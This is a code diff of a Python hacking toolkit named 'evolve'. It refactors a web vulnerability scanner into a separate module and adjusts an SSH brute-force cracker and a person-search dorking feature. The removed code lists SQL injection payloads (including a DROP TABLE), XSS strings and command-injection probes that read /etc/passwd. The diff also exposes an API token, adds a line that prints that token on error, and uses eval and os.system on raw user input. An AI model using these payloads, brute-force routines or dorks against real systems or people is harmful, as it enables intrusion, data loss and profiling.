@@ -14,295 +14,17 @@ from zxcvbn import zxcvbn
 import math
 import re
 import paramiko
+from dotenv import load_dotenv
 
+from websec import WebSec
+
+load_dotenv()
 init(autoreset=True)
 
 loading = False
 
+
 os.system("title evolve")
-
-class WebSec:
-    def __init__(self, url):
-        if not url.startswith(("http://", "https://")):
-            self.url = "http://" + url
-        else:
-            self.url = url
-
-    def print_custom_art(self):
-        custom_art = """
-░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓███████▓▒░▒▓████████▓▒░▒▓██████▓▒░  
-░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ 
-░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░        
-░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓██████▓▒░░▒▓█▓▒░        
-░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░        
-░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ 
- ░▒▓█████████████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓██████▓▒░  
-        """
-        screen_width = os.get_terminal_size().columns
-        lines = custom_art.strip().split('\n')
-        for line in lines:
-            print(Fore.RED + line.center(screen_width) + Style.RESET_ALL)
-
-    def get_whois_info(self):
-        print("\nRetrieving WHOIS information...")
-        domain = self.url.split("://")[-1].split("/")[0]
-        try:
-            whois_info = whois.whois(domain)
-            print(Fore.GREEN + str(whois_info) + Style.RESET_ALL)
-        except Exception as e:
-            print(f"\n{Fore.RED}Error retrieving WHOIS information: {e}{Style.RESET_ALL}")
-
-    def test_sql_injection(self):
-        payloads = [
-            "' OR '1'='1' --",
-            "' OR '1'='1' /*",
-            "' OR '1'='1' AND SLEEP(5) --",
-            "' UNION SELECT NULL, username, password FROM users --",
-            "'; DROP TABLE users; --",
-            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
-        ]
-        
-        print("\nTesting for SQL Injection...")
-        found_vulnerability = False
-        severity = "None"
-        for payload in payloads:
-            try:
-                response = requests.get(self.url, params={'input': payload}, timeout=5)
-                if response.status_code == 200:
-                    if "error" in response.text.lower() or "sql" in response.text.lower():
-                        severity = "High"
-                        print(f"{Fore.RED}Potential SQL Injection vulnerability detected with payload: {payload}{Style.RESET_ALL}")
-                        found_vulnerability = True
-            except Exception as e:
-                print(f"Error while testing payload '{payload}': {e}")
-        
-        if not found_vulnerability:
-            print(f"{Fore.GREEN}No SQL Injection vulnerabilities found.{Style.RESET_ALL}\n")
-        else:
-            print(f"{Fore.RED}SQL Injection severity: {severity}{Style.RESET_ALL}\n")
-        print(f"{Fore.GREEN}SQL Injection testing completed.")
-
-    def test_xss(self):
-        payloads = [
-            "<script>alert('XSS');</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
-            "'><script>alert('XSS')</script>",
-            "<body onload=alert('XSS')>",
-            "<input type='text' value='\";alert(1);//'>"
-        ]
-        
-        print("\nTesting for XSS...")
-        found_vulnerability = False
-        severity = "None"
-
-        for payload in payloads:
-            try:
-                response = requests.get(self.url, params={'input': payload}, timeout=5)
-
-                if response.status_code == 200 and 'text/html' in response.headers.get('Content-Type',''):
-                    if payload in response.text or "alert(1)" in response.text or 'onerror' in response.text or 'onload' in response.text:
-                        severity = "High"
-                        print(f"{Fore.RED}Potential XSS vulnerability detected with payload: {payload}{Style.RESET_ALL}")
-                        found_vulnerability = True
-            except Exception as e:
-                print(f"Error while testing payload '{payload}': {e}")
-        
-        if not found_vulnerability:
-            print(f"{Fore.GREEN}No XSS vulnerabilities found.{Style.RESET_ALL}\n")
-        else:
-            print(f"{Fore.RED}XSS severity: {severity}{Style.RESET_ALL}\n")
-        print(f"{Fore.GREEN}XSS testing completed.")
-
-    def test_reflected_xss(self):
-        reflected_payloads = [
-            "<script>alert('Reflected xss');</script>",
-            "'><script>alert('Reflected xss');</script>",
-            "';alert('Reflected XSS 3');//"
-        ]
-        print("\nTesting for Reflected XSS...")
-        for payload in reflected_payloads:
-            try:
-                response = requests.get(f"{self.url}?input={payload}",timeout=5)
-                if payload in response.text:
-                    print(f"{Fore.RED}Potential Reflected XSS vulnerability detected with payload: {payload}{Style.RESET_ALL}")
-                else:
-                    print(f"{Fore.GREEN}No Reflected XSS vulnerability found for payload: {payload}{Style.RESET_ALL}")
-
-            except Exception as e:
-                print(f"Error while testing for reflected XSS : {e}")
-
-    def test_stored_xss(self):
-        stored_payloads = [
-        "<script>alert('Stored XSS 1');</script>",
-        "<img src=x onerror=alert('Stored XSS 2')>",
-        "';alert('Stored XSS 3');//",
-        "<svg/onload=alert('Stored XSS 4')>",
-        "<iframe src='javascript:alert(\"Stored XSS 5\")'></iframe>"
-            ]    
-        print("\nTesting for Stored XSS...") 
-        for payload in stored_payloads:  
-            try:
-                response_post = requests.post(f"{self.url}/comments", data={'comment': payload}, timeout=5)
-                if response_post.status_code == 200:
-                    response_get = requests.get(f"{self.url}/comments",timeout=5)
-                    if payload in response_get.text:
-                        print(f"{Fore.RED}Potential Stored XSS vulnerability detected with payload :{post_payload}{Style.RESET_ALL}")
-                    else:
-                        print(f"{Fore.GREEN}No stored XSS vulnerability found.{Style.RESET_ALL}")
-            except Exception as e:
-                print(f"Error while testing for stored XSS: {e}")
-
-
-    def test_dom_xss(self):
-        dom_payloads = [
-            "javascript:alert('DOM XSS')",
-            "javascript:alert(document.cookie)",
-            "<script>alert('DOM XSS');</script>",
-            "<svg/onload=alert('DOM XSS')>"
-        ]
-        print("\nTesting for DOM XSS...")
-        for payload in dom_payloads:
-            try:
-                response = requests.get(f"{self.url}?param={payload}", timeout=5)
-                if payload in response.text:
-                    print(f"{Fore.RED}Potential DOM XSS vulnerability detected with payload: {payload}{Style.RESET_ALL}")
-                else:
-                    print(f"{Fore.GREEN}No DOM XSS vulnerability found for payload: {payload}{Style.RESET_ALL}")
-            except Exception as e:
-                print(f"Error while testing for DOM XSS: {e}")
-
-    def run_tests(self):
-        self.test_reflected_xss()
-        self.test_stored_xss()
-        self.test_dom_xss()
-        
-    def test_csrf(self):
-        print("\nTesting for CSRF...")
-        session = requests.Session()
-        response = session.get(self.url, timeout=5)
-        
-        if "csrf" in response.text.lower() or "token" in response.text.lower():
-            print(f"\n{Fore.GREEN}CSRF protection mechanism detected in the form of tokens.{Style.RESET_ALL}")
-            print(f"{Fore.RED}CSRF severity: Low{Style.RESET_ALL}\n")
-        else:
-            print(f"\n{Fore.RED}No CSRF protection mechanism detected.{Style.RESET_ALL}")
-            print(f"{Fore.RED}CSRF severity: High{Style.RESET_ALL}\n")
-        
-        print(f"{Fore.GREEN}CSRF testing completed.")
-
-    def test_command_injection(self):
-        payloads = [
-            "; cat /etc/passwd",
-            "&& cat /etc/passwd",
-            "| cat /etc/passwd",
-            "; ls",
-            "&& ls",
-            "| ls",
-            "`cat /etc/passwd`",     
-            "; whoami",                
-            "&& whoami",
-            "| whoami"
-        ]
-        print("\nTesting for Command Injection...")
-        found_vulnerability = False
-        severity = "None"
-        
-        for payload in payloads:
-            try:
-                response = requests.get(self.url, params={'input': payload}, timeout=5)
-                if response.status_code == 200:
-                    response_text = response.text.lower()
-                    if any(indicator in response_text for indicator in ["root:", "user:", "etc/passwd", "etc/shadow"]):
-                        severity = "High"
-                        print(f"{Fore.RED}Potential Command Injection vulnerability detected with payload: {payload}{Style.RESET_ALL}")
-                        found_vulnerability = True
-
-                    elif any(indicator in response_text for indicator in ["linux", "ubuntu", "kernel"]):
-                        severity = "Medium"
-                        print(f"{Fore.YELLOW}Potential exposure of system information detected with payload: {payload}{Style.RESET_ALL}")
-                        found_vulnerability = True
-
-                    elif any(indicator in response_text for indicator in ["command not found", "syntax error"]):
-                        severity = "Medium"
-                        print(f"{Fore.YELLOW}Potential command execution issue detected with payload: {payload}{Style.RESET_ALL}")
-                        found_vulnerability = True
-
-                    elif "path=" in response_text:
-                        severity = "Medium"
-                        print(f"{Fore.YELLOW}Potential exposure of environment variables detected with payload: {payload}{Style.RESET_ALL}")
-                        found_vulnerability = True
-
-            except Exception as e:
-                print(f"Error while testing payload '{payload}' : {e}")
-
-        if not found_vulnerability:
-            print(f"\n{Fore.GREEN}No Command Injection vulnerabilities found.{Style.RESET_ALL}\n")
-        else:
-            print(f"{Fore.RED}Command Injection severity: {severity}{Style.RESET_ALL}\n")
-        print(f"{Fore.GREEN}Command Injection testing completed.")
-
-    def scan_open_ports(self):
-        common_ports = {
-            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
-            80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 3306: 'MySQL',
-            3389: 'RDP'
-        }
-        print("\nScanning for open ports...")
-        host = self.url.split("://")[-1].split("/")[0].split(":")[0]
-        try:
-            ip_address = socket.gethostbyname(host)
-        except socket.gaierror:
-            print(f"{Fore.RED}Unable to resolve IP address for the host: {host}{Style.RESET_ALL}")
-            return
-        
-        open_ports = []
-
-        for port, service in common_ports.items():
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
-            result = sock.connect_ex((ip_address, port))
-            if result == 0:
-                open_ports.append((port, service))
-            sock.close()
-        if open_ports:
-            for port, service in open_ports:
-                print(f"\n{Fore.RED}Open port detected: Port {port} ({service}){Style.RESET_ALL}")
-        else:
-            print(f"{Fore.GREEN}No open ports detected.{Style.RESET_ALL}")
-        print(f"{Fore.GREEN}Open ports testing completed.\n")
-
-    def find_api_keys(self,url):
-        response = requests.get(url)
-        if response.status_code == 200:
-            source_code = response.text 
-
-            api_key_patterns = [ 
-            r'AKIA[0-9A-Z]{16}',
-            r'[^A-Za-z0-9](?P<key>[A-Za-z0-9]{40})',
-            r'AIza[0-9A-Za-z-_]{35}', 
-            r'sk_[0-9a-zA-Z]{32}',    
-            r'pk_[0-9a-zA-Z]{32}',
-            r'v=[0-9a-zA-Z-_]{20,30}',
-            ]
-        
-            found_keys = []
-            for pattern in api_key_patterns:
-                matches = re.findall(pattern, source_code)
-                found_keys.extend(matches)
-
-            if found_keys:
-                print(Fore.RED + "API Keys found:" + Style.RESET_ALL)
-                for idx, key in enumerate(found_keys, start=1):
-                    print(f"{idx} - {key}")
-            else:
-                print(Fore.GREEN + "No API keys found." + Style.RESET_ALL)
-
-            return found_keys
-        else:
-            print(Fore.YELLOW+"Failed to retrieve URL"+Style.RESET_ALL)
-            return []
 
 def calc_entropy(file_path):
     with open(file_path,'rb') as f:
@@ -348,7 +70,6 @@ def love_art(evolve_art):
         centered_lines.append(centered_line)
     return "\n".join(centered_lines)
 
-
 def loading_animation(task_description):
     animation = "|/-\\"
     idx = 0
@@ -358,7 +79,7 @@ def loading_animation(task_description):
         idx += 1
         time.sleep(0.1)
 
-def evolve_search(name):
+def hunter(name):
     query = (f'"{name}" site:instagram.com OR site:facebook.com OR filetype:pdf OR filetype:xls OR filetype:csv OR filetype:docx ')
     encoded_query = urllib.parse.quote(query)
     url = f"https://www.google.com/search?q={encoded_query}"
@@ -421,7 +142,6 @@ def search_web(query):
         return []
 
 def run_script(script_path):
-    """Execute a Python or batch script."""
     if not os.path.exists(script_path):
         print(Fore.RED + f"Error: The script '{script_path}' does not exist." + Style.RESET_ALL)
         return
@@ -433,7 +153,7 @@ def run_script(script_path):
         print(Fore.RED + "Error: Only python and batch scripts are supported for now." + Style.RESET_ALL)
 
 def ip_geolocation(ip_address):
-    token = 'e014091be9f321'
+    token = os.getenv('IP_TOKEN')
     url = f"https://ipinfo.io/{ip_address}?token={token}"
     
     response = requests.get(url)
@@ -443,13 +163,13 @@ def ip_geolocation(ip_address):
         country = data.get("country", "N/A")
         city = data.get("city", "N/A")
         isp = data.get("org", "N/A")
-        
         print(f"IP Address: {ip_address}")
         print(f"Country: {country}")
         print(f"City: {city}")
         print(f"ISP: {isp}")
     else:
         print(Fore.RED + "Error retrieving geolocation data." + Style.RESET_ALL)
+        print(token)
 
 def check_password_strength(password):
     result = zxcvbn(password)
@@ -535,11 +255,14 @@ def cracker():
         passwords = read_wordlist(wordlist)
         print(Fore.GREEN + f"[+] Loaded {len(passwords)} passwords from the wordlist." + Style.RESET_ALL)
         success = bruteforce(hostname, username, passwords)
-    elif method == 'keywords':
+    elif method == 'keywords' or method == 'keyword':
         keywords = input(Fore.YELLOW + "Enter keywords separated by space: " + Style.RESET_ALL).split()
         passwords = generate_combinations(keywords)
         print(Fore.GREEN + f"[+] Generated {len(passwords)} password combinations." + Style.RESET_ALL)
         success = bruteforce(hostname, username, passwords)
+    else:
+        print(Fore.RED + "Invalid cracker command.")
+        print(Fore.CYAN + "Valid commands : 'ssh brute', 'cracker create', 'quit'" + Style.RESET_ALL)
 
     if success:
         print(Fore.GREEN + f"[+] Password successfully found: {success}" + Style.RESET_ALL)
@@ -563,28 +286,26 @@ def create_custom_wordlist():
 
 def display_help():
     help_text = """
-
        Commands:
          ____________________________________________________________________________________________
         | run websec          : Launches the WebSec security testing tool.                           |
         | sys scan            : Scans the system for malicious files and software.                   |
         | run hunter          : Search for a person online and relevant information.                 | 
         | search web          : Searches the web for specified keywords and returns a summary.       |
-        | run script <script> : Executes a specified Python or Batch script directly.                |
+        | run cracker         : Launches the cracker tool for brute force password attacks.          |
+        |       --- Subcommands for Cracker:                                                         |
+        |       ssh brute         : Initiates an SSH brute force attack using a wordlist or keywords.|
+        |       cracker create    : Creates a custom wordlist based on a specified range of numbers. |
+        |       quit              : Exits the cracker tool and returns to the previous menu.         |
+        | run script <script_path> : Executes a specified Python or Batch script directly.           |
         | cipher <password>   : Evaluates the strength of the provided password.                     |
         | geo <ip_address>    : Provides geographical information about an IP address.               |
         | calc                : Performs basic calculations.                                         |
         | clear               : Clears the command line screen.                                      |
         | exit                : Exits the evolve tool.                                               |
-        | run cracker         : Launches the cracker tool for brute force password attacks.          |
-        |   --- Subcommands for Cracker:                                                             |
-        |   ssh brute         : Initiates an SSH brute force attack using a wordlist or keywords.    |
-        |   cracker create    : Creates a custom wordlist based on a specified range of numbers.     |
-        |   quit              : Exits the cracker tool and returns to the previous menu.             |
         |____________________________________________________________________________________________|
     """
     print(Fore.LIGHTGREEN_EX + help_text + Style.RESET_ALL)
-
 
 
 def main():
@@ -651,25 +372,25 @@ def main():
             time.sleep(0.5)
 
             loading = True
-            threading.Thread(target=loading_animation, args=("Testing for SQL Injection...",)).start()
+            threading.Thread(target=loading_animation, args=("Testing for SQL Injection vulnerabilities...",)).start()
             tester.test_sql_injection()
             loading = False
             time.sleep(0.5)
     
             loading = True
-            threading.Thread(target=loading_animation, args=("Testing for Reflected XSS...",)).start()
+            threading.Thread(target=loading_animation, args=("Testing for XSS vulnerabilities...",)).start()
             tester.run_tests()
             loading = False
             time.sleep(0.5)
 
             loading = True
-            threading.Thread(target=loading_animation, args=("Testing for CSRF...",)).start()
+            threading.Thread(target=loading_animation, args=("Testing for CSRF vulnerabilities...",)).start()
             tester.test_csrf()
             loading = False
             time.sleep(0.5)
         
             loading = True
-            threading.Thread(target=loading_animation, args=("Testing for Command Injection...",)).start()
+            threading.Thread(target=loading_animation, args=("Testing for Command Injection vulnerabilities...",)).start()
             tester.test_command_injection()
             loading = False
             time.sleep(0.5)
@@ -682,7 +403,6 @@ def main():
             loading_thread.join()
             time.sleep(0.5)
 
-    
         elif command == "sys scan":
             sys_scan()
 
@@ -695,12 +415,18 @@ def main():
                                     ██   ██  ██████  ██   ████    ██    ███████ ██   ██
                   """)
             name = input("Enter the name : ")
-            results = evolve_search(name)
+            results = hunter(name)
             print(Fore.GREEN+"Search Results : "+Style.RESET_ALL)
             for link in results:
                 print(Fore.LIGHTCYAN_EX+" * ",link)
 
         elif command == "run cracker":
+            print(Fore.RED+"""                                                                       
+                                    ____ ____ ____ ____ ____ ____ _____
+                                    ||c |||r |||a |||c |||k |||e |||r ||
+                                    ||__|||__|||__|||__|||__|||__|||__||
+                                    |/__\|/__\|/__\|/__\|/__\|/__\|/__\|
+                  """)
             while True:
                 sub_command = input(Fore.GREEN + "cracker>>"+Style.RESET_ALL).strip().lower()
 
@@ -721,6 +447,11 @@ def main():
                         print(Fore.GREEN + f"[+]Generated {len(passwords)} password combinations" + Style.RESET_ALL)
                         success = bruteforce(hostname,username,passwords)
 
+                    if success:
+                        print(Fore.GREEN + f"Password successfully found: {success}" + Style.RESET_ALL)
+                    else:
+                        print(Fore.RED + "No password found. Try expanding the wordlist or keyword combinations." + Style.RESET_ALL)
+
                 elif sub_command == "quit":
                     break
 
@@ -729,13 +460,8 @@ def main():
 
                 else:
                     print(Fore.RED + "Invalid cracker command.")
-                    print(Fore.CYAN + "Valid commands : 'ssh brute', 'cracker create' 'exit', 'quit'" + Style.RESET_ALL)
-
-                    if success:
-                        print(Fore.GREEN + f"Password successfully found: {success}" + Style.RESET_ALL)
-                    else:
-                        print(Fore.RED + "No password found. Try expanding the wordlist or keyword combinations." + Style.RESET_ALL)
-
+                    print(Fore.CYAN + "Valid commands : 'ssh brute', 'cracker create', 'quit'" + Style.RESET_ALL)
+     
         elif command == "search web":
             query = input("What should I search for : ")
             results = search_web(query)
@@ -768,9 +494,8 @@ def main():
             while True:
                 expression = input(Fore.GREEN + "calc>>" + Style.RESET_ALL)
 
-                if expression.lower() == "exit":
+                if expression.lower() == "quit":
                     break
-
                 try:
                     result = eval(expression)
                     print(Fore.CYAN + f"{result}"+Style.RESET_ALL)
@@ -792,7 +517,7 @@ def main():
         elif command == "help":
             display_help()
 
-        elif command == "evolve --help":
+        elif command == "evolve -help" or command == "evolve -h":
             display_help()
 
         elif command == "clear":
@@ -800,7 +525,6 @@ def main():
         
         elif command == "exit":
             sys.exit()
-
         else:
             exit_code = os.system(command)
             if exit_code != 0 :
